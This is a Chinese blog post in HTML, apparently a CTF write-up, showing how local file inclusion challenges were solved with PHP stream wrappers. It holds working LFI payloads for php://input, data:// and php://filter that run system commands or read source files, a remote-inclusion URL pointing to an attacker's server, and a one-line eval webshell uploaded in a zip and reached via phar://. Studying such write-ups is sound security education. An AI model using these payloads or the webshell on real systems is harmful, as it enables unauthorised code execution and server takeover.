@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Local file inclusion - 非零跳转</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="非零跳转"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="非零跳转"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本地文件包含经常配合文件上传使用。即上传图片马-&amp;gt;文件包含执行 PHP伪协议     协议 allow_url_fopen allow_url_include PHP版本 用法    php:&amp;#x2F;&amp;#x2F;input 不受限 On  ?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;input [POST DATA]    php:&amp;#x2F;&amp;#x2F;filter 不受限"><meta property="og:type" content="blog"><meta property="og:title" content="Local file inclusion"><meta property="og:url" content="http://jnzjahangir.top/posts/e46de030b77f/"><meta property="og:site_name" content="非零跳转"><meta property="og:description" content="本地文件包含经常配合文件上传使用。即上传图片马-&amp;gt;文件包含执行 PHP伪协议     协议 allow_url_fopen allow_url_include PHP版本 用法    php:&amp;#x2F;&amp;#x2F;input 不受限 On  ?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;input [POST DATA]    php:&amp;#x2F;&amp;#x2F;filter 不受限"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/1.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/2.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/3.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/4.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/9.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/16.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/10.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/11.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/2.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/5.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/6.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/7.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/8.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/6.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/12.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/13.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/14.png"><meta property="og:image" content="http://jnzjahangir.top/posts/e46de030b77f/15.png"><meta property="article:published_time" content="2023-10-31T11:42:00.000Z"><meta property="article:modified_time" content="2023-10-31T11:42:00.000Z"><meta property="article:author" content="Jnz"><meta property="article:tag" content="CTF"><meta property="article:tag" content="文件包含"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://jnzjahangir.top/posts/e46de030b77f/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://jnzjahangir.top/posts/e46de030b77f/"},"headline":"Local file inclusion","image":["http://jnzjahangir.top/posts/e46de030b77f/1.png","http://jnzjahangir.top/posts/e46de030b77f/2.png","http://jnzjahangir.top/posts/e46de030b77f/3.png","http://jnzjahangir.top/posts/e46de030b77f/4.png","http://jnzjahangir.top/posts/e46de030b77f/9.png","http://jnzjahangir.top/posts/e46de030b77f/16.png","http://jnzjahangir.top/posts/e46de030b77f/10.png","http://jnzjahangir.top/posts/e46de030b77f/11.png","http://jnzjahangir.top/posts/e46de030b77f/2.png","http://jnzjahangir.top/posts/e46de030b77f/5.png","http://jnzjahangir.top/posts/e46de030b77f/6.png","http://jnzjahangir.top/posts/e46de030b77f/7.png","http://jnzjahangir.top/posts/e46de030b77f/8.png","http://jnzjahangir.top/posts/e46de030b77f/6.png","http://jnzjahangir.top/posts/e46de030b77f/12.png","http://jnzjahangir.top/posts/e46de030b77f/13.png","http://jnzjahangir.top/posts/e46de030b77f/14.png","http://jnzjahangir.top/posts/e46de030b77f/15.png"],"datePublished":"2023-10-31T11:42:00.000Z","dateModified":"2023-10-31T11:42:00.000Z","author":{"@type":"Person","name":"Jnz"},"publisher":{"@type":"Organization","name":"非零跳转","logo":{"@type":"ImageObject","url":"http://jnzjahangir.top/img/logo.svg"}},"description":"本地文件包含经常配合文件上传使用。即上传图片马-&gt;文件包含执行 PHP伪协议     协议 allow_url_fopen allow_url_include PHP版本 用法    php:&#x2F;&#x2F;input 不受限 On  ?file&#x3D;php:&#x2F;&#x2F;input [POST DATA]    php:&#x2F;&#x2F;filter 不受限"}</script><link rel="canonical" href="http://jnzjahangir.top/posts/e46de030b77f/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css2?family=Noto+Sans+SC:wght@400;600&amp;family=Roboto+Mono"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="非零跳转" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><h1 class="title is-3 is-size-4-mobile">Local file inclusion</h1><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><i class="fa-solid fa-calendar-days fa-fw"></i><span class="level-item"><time dateTime="2023-10-31T11:42:00.000Z" title="2023/10/31 19:42:00">2023-10-31</time>发表</span><i class="fa-solid fa-calendar-check fa-fw"></i><span class="level-item"><time dateTime="2023-10-31T11:42:00.000Z" title="2023/10/31 19:42:00">2023-10-31</time>更新</span><span class="level-item"><i class="fa-regular fa-folder-open fa-fw"></i><a class="link-muted" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span><span class="level-item"><i class="fa-solid fa-book fa-fw"></i>6 分钟读完 (大约841个字)</span></div></div><div class="content"><p>本地文件包含经常配合文件上传使用。即上传图片马-&gt;文件包含执行</p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><center>
+
+<table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th align="center">allow_url_fopen</th>
+<th align="center">allow_url_include</th>
+<th align="center">PHP版本</th>
+<th align="center">用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">php:&#x2F;&#x2F;input</td>
+<td align="center">不受限</td>
+<td align="center">On</td>
+<td align="center"></td>
+<td align="center">?file&#x3D;php:&#x2F;&#x2F;input [POST DATA] <?php [代码] ?></td>
+</tr>
+<tr>
+<td align="center">php:&#x2F;&#x2F;filter</td>
+<td align="center">不受限</td>
+<td align="center">不受限</td>
+<td align="center"></td>
+<td align="center">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</td>
+</tr>
+<tr>
+<td align="center">zip:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;、bzip:&#x2F;&#x2F;</td>
+<td align="center">不受限</td>
+<td align="center">不受限</td>
+<td align="center">&gt;&#x3D;php5.3.0</td>
+<td align="center">?file&#x3D;zip:&#x2F;&#x2F;[压缩包绝对路径]%23[压缩包内文件]</td>
+</tr>
+<tr>
+<td align="center">phar:&#x2F;&#x2F;</td>
+<td align="center">不受限</td>
+<td align="center">不受限</td>
+<td align="center">&gt;&#x3D;php5.3.0</td>
+<td align="center">?file&#x3D;phar:&#x2F;&#x2F;[压缩包路径]&#x2F;[压缩包内文件]</td>
+</tr>
+<tr>
+<td align="center">data:&#x2F;&#x2F;</td>
+<td align="center">On</td>
+<td align="center">On</td>
+<td align="center"></td>
+<td align="center">?file&#x3D;data:&#x2F;&#x2F;, ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[编码后的php代码]</td>
+</tr>
+</tbody></table>
+</center>
+
+<span id="more"></span>
+
+<p><code>allow_url_fopen</code>为<code>On</code>时，能读取远程文件，例如<code>file_get_contents()</code>就能读远程文件<br><code>allow_url_include</code>为<code>On</code>时，就能使用<code>include</code>和<code>require</code>等方式包含远程文件<br>需要注意的是，zip:&#x2F;&#x2F;伪协议需要安装zlib扩展  </p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><h4 id="Yulin招新LFI第二题"><a href="#Yulin招新LFI第二题" class="headerlink" title="Yulin招新LFI第二题"></a>Yulin招新LFI第二题</h4><p>打开题目页面，只有一个phpinfo链接<br><img src="/posts/e46de030b77f/1.png" alt="题目"><br>查看<em>phpinfo</em>，发现<code>allow_url_fopen</code>和<code>allow_url_include</code>都为$On$<br><img src="/posts/e46de030b77f/2.png" alt="phpinfo"><br>任意包含一个文件，出现提示 <em>flag在当前目录的某个文件中</em><br>因此考虑使用<code>php://input</code>伪协议执行代码<br><img src="/posts/e46de030b77f/3.png" alt="post"><br>构造代码<code>&lt;?php system(&quot;ls&quot;); ?&gt;</code>进行post，得到文件列表，flag显然在flag_195780473.txt中，<code>cat flag_195780473.txt</code>得到flag<br><img src="/posts/e46de030b77f/4.png" alt="flag"></p>
+<h4 id="Yulin招新LFI第五题"><a href="#Yulin招新LFI第五题" class="headerlink" title="Yulin招新LFI第五题"></a>Yulin招新LFI第五题</h4><p>打开题目页面，展示了源代码<br><img src="/posts/e46de030b77f/9.png" alt="题目"><br>发现代码逻辑为读取<code>file</code>参数传入的文件内容，将其与<code>I want flag</code>进行比较，相等则给出flag<br>刚开始思路为远程文件包含。在远程服务器建立html文件，内容为<code>I want flag</code>，<strong>使用file_put_contents函数</strong>构造payload<code>?file=http://[remote addr]/payload.html</code>直接get远程文件即可<br><img src="/posts/e46de030b77f/16.png" alt="flag"><br>该题还可以使用<code>php://input</code>伪协议绕过<code>file_get_contents</code>函数<br>在burpsuite构建post数据<br><img src="/posts/e46de030b77f/10.png" alt="post"><br>成功get flag<br><img src="/posts/e46de030b77f/11.png" alt="flag"><br>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/401511726">CTF bugku web file_get_contents WriteUp</a></p>
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><h4 id="Yulin招新LFI第三题"><a href="#Yulin招新LFI第三题" class="headerlink" title="Yulin招新LFI第三题"></a>Yulin招新LFI第三题</h4><p>题目页面同上第二题，只有一个phpinfo链接，查看<em>phpinfo</em>，发现<code>allow_url_fopen</code>和<code>allow_url_include</code>都为$On$<br><img src="/posts/e46de030b77f/2.png" alt="phpinfo"><br>重复上题操作，发现题目过滤了<code>php://input</code>伪协议<br><img src="/posts/e46de030b77f/5.png" alt="hack"><br>因此考虑使用<code>data://</code>伪协议，尝试构造payload<code>?file=data://text/plain,%20&lt;?php%20system(&quot;ls&quot;);%20?&gt;</code>，发现执行成功<br><img src="/posts/e46de030b77f/6.png" alt="ls"><br>直接<code>cat flag_8491675293.txt</code>得到flag<br><img src="/posts/e46de030b77f/7.png" alt="flag">  </p>
+<h3 id="php-fliter"><a href="#php-fliter" class="headerlink" title="php:&#x2F;&#x2F;fliter"></a>php:&#x2F;&#x2F;fliter</h3><p>以Yulin招新LFI第四题为例<br>题目页面提示flag就在flag.php内<br><img src="/posts/e46de030b77f/8.png" alt="tips"><br>但没有显示，因此考虑使用<code>php://fliter</code>伪协议直接读取flag.php内容<br><img src="/posts/e46de030b77f/6.png"><br>得到flag.php内容的base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ+WwseWcqOi/me+8jOWPr+aYr+iXj+WcqOWTqumHjO+8nyjila/CsNCUwrAp4pWvIOKUu+KUgeKUuw0KPD9waHANCiRmbGFnID0gJ1l1bGluU2Vje04wd195MHVfc2VlX21lITc1MTRXUXp4d30nOw0KPz4NCg==</span><br></pre></td></tr></table></figure>
+<p>解码得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag就在这，可是藏在哪里？(╯°Д°)╯ ┻━┻</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;YulinSec&#123;N0w_y0u_see_me!7514WQzxw&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><h4 id="Yulin招新LFI第六题"><a href="#Yulin招新LFI第六题" class="headerlink" title="Yulin招新LFI第六题"></a>Yulin招新LFI第六题</h4><p>打开题目，观察链接，推测文件包含时在输入的<code>file</code>值后添加了<code>.php</code>，因此无法直接构造图片马上传<br><img src="/posts/e46de030b77f/12.png" alt="题目"><br>因此考虑使用压缩包上传木马，构造木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;6&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>将其压缩为zip上传<br><img src="/posts/e46de030b77f/13.png" alt="upload"><br>打开蚁剑，用<code>phar://</code>伪协议直接连接<br><img src="/posts/e46de030b77f/14.png" alt="connect"><br>成功get flag<br><img src="/posts/e46de030b77f/15.png" alt="flag">  </p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>Local file inclusion</p><p><a href="http://jnzjahangir.top/posts/e46de030b77f/">http://jnzjahangir.top/posts/e46de030b77f/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Jnz</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-10-31</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-10-31</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 mb-4"><span class="mr-2"><i class="fa-solid fa-tag fa-fw"></i> </span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><div class="social-share"></div><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/82896ba756e9/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2024网鼎杯青龙组Reverse部分WriteUp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/930c56c4c613/"><span class="level-item">2023 Yulin Recruit Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js"></script><script>new Valine({
+            el: '#valine-thread',
+            appId: "htBe2vyV6GcBjZ8A9IdtgkPf-gzGzoHsz",
+            appKey: "1WkVIqvJ5VHJa6R9AO0s5vrn",
+            
+            avatar: "mm",
+            avatarForce: false,
+            meta: ["nick","mail"],
+            pageSize: 10,
+            lang: "zh-CN",
+            visitor: false,
+            highlight: true,
+            recordIP: false,
+            
+            
+            
+            enableQQ: false,
+            requiredFields: [],
+        });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-96x96 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="Jnz"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Jnz</p><p class="is-size-6 is-block" style="margin-bottom: 3px;">重生之我要成为逆向大手子</p><p class="is-size-6 is-flex justify-content-center"><span><i class="fa-solid fa-school fa-fw"></i> UESTC</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">7</p></a></div></div></nav></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#PHP伪协议"><span class="level-left"><span class="level-item">1</span><span class="level-item">PHP伪协议</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#php-input"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">php://input</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Yulin招新LFI第二题"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">Yulin招新LFI第二题</span></span></a></li><li><a class="level is-mobile" href="#Yulin招新LFI第五题"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">Yulin招新LFI第五题</span></span></a></li></ul></li><li><a class="level is-mobile" href="#data"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">data://</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Yulin招新LFI第三题"><span class="level-left"><span class="level-item">1.2.1</span><span class="level-item">Yulin招新LFI第三题</span></span></a></li></ul></li><li><a class="level is-mobile" href="#php-fliter"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">php://fliter</span></span></a></li><li><a class="level is-mobile" href="#phar"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">phar://</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Yulin招新LFI第六题"><span class="level-left"><span class="level-item">1.4.1</span><span class="level-item">Yulin招新LFI第六题</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="非零跳转" height="28"></a><p class="is-size-7"><span>&copy; 2024 Jnz</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      },
+      chtml: {
+        matchFontHeight: false
+      }
+    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
